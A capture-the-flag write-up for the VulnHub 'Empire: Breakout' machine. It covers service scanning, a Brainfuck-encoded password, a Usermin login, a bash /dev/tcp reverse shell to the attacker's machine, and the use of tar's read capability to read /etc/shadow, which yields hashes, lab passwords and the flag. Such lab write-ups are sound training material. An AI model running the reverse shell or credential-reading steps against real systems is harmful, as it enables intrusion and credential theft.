Box Link: https://www.vulnhub.com/entry/empire-breakout,751/

Difficulty: Easy

## Recon
- Requires a username & password
- No feedback given upon failure

## Scanning
IP: eth0: 192.168.68.109

What services are running on the target?
`nmap -sCV -v -oN tcp 192.168.68.109`
- Scan for service versions & default scripts, with verbose, output to file `tcp`

| Port      | Service                 | Version | Description                                                                                  |
| --------- | ----------------------- | ------- | -------------------------------------------------------------------------------------------- |
| 80/tcp    | Apache httpd            | 2.4.51  | Apache web server                                                                            |
| 139/tcp   | netbios-ssn samba smbd  | 4.6.2   | smbd is the server daemon that provides filesharing and printing services to Windows clients |
| 445/tcp   | netbios-ssn samba smbd  | 4.6.2   | smbd is the server daemon that provides filesharing and printing services to Windows clients |
| 10000/tcp | MiniServ (Webmin httpd) | 1.981   | Web-based admin system                                                                       |
| 20000/tcp | MiniServ (Webmin httpd)                | 1.830   | Web-based admin system                                                                       |

Running an `smbmap -H 192.168.68.109` checked for all the disks hosted:
```shell
[+] IP: 192.168.68.109:10000	Name: 192.168.68.109                                    
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.13.5-Debian)
```

Running `gobuster` on the site also identified the `/server-status` which resulted in a 403 (Forbidden).

https://192.168.68.109:10000/ is running a **Webmin** login

https://192.168.68.109:20000/ is running a **Usermin** login

Hidden at the bottom of the page-source for the default page is:
```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.
```
This is written in brain fuck, when run it decrypts a password: `.2uqPEfj3D<P'a-3`

Running `enum4linux -a 192.168.68.109` which scans for smb information, identified a user:
`S-1-22-1-1000 Unix User\cyber (Local User)`

Attempting to log into `Usermin` *(port 20000)* with:
- Username: `cyber`
- Password: `.2uqPEfj3D<P'a-3`

Results in success

## Exploitation

After logging into the user account, noticed there was a command terminal.

Ran `bash -i >& /dev/tcp/PARROT_IP/4444 0>&1` on the target to open a reverse shell.
Then using netcat `nc -lvp 4444` on the parrot machine I have connected as cyber.

Gaining some information on the target system:
`cat /proc/version || uname -a`
```
Linux version 5.10.0-9-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.70-1 (2021-09-30)
```

`lsb_release -a`
```
No LSB modules are available.
Distributor ID:	Debian
Description:	Debian GNU/Linux 11 (bullseye)
Release:	11
Codename:	bullseye
```

`cat /etc/os-release`
```
PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
NAME="Debian GNU/Linux"
VERSION_ID="11"
VERSION="11 (bullseye)"
VERSION_CODENAME=bullseye
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```

We can see they are running Debian Bullseye version 11.

Now we want to gain root access: Privilege escalation.
Exploring an interesting article for PE using getcap https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/?source=post_page-----dc3170d7748f--------------------------------

When we run `getcap -r / 2>/dev/null` we can see some interesting permissions on the ./tar binary. `cap_dac_read_search` can be seen on the binary.

**CAP_DAC_READ_SEARCH** [Source](https://linux.die.net/man/7/capabilities)
- Bypass file read permission checks and directory read and execute permission checks.

This means we can archive files or directories we don't have permission to access then extract them to view their contents.

Targeting the `/etc/shadow` file we can get all the password hashes for the different accounts on the system.

`tar -cvf shadow.tar /etc/shadow` to archive the dir
`tar -xvf shadow.tar` to extract it

```shell
$ cat shadow
root:$y$j9T$M3BDdkxYOlVM6ECoqwUFs.$Wyz40CNLlZCFN6Xltv9AAZAJY5S3aDvLXp0tmJKlk6A:18919:0:9
...
cyber:$y$j9T$x6sDj5S/H0RH4IGhi0c6x0$mIPyCIactTA3/gxTaI7zctfCt2.EOGXTOW4X9efAVW4:18919:0:
```

Above would have forced me to crack the hash, so we check the `/var/backups/.old_pass.bak` using the same method, and we find an old password:
`Ts&4&YurgtRX(=~h`

`cat /root/rOOt.txt` reveals the final flag: `3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}`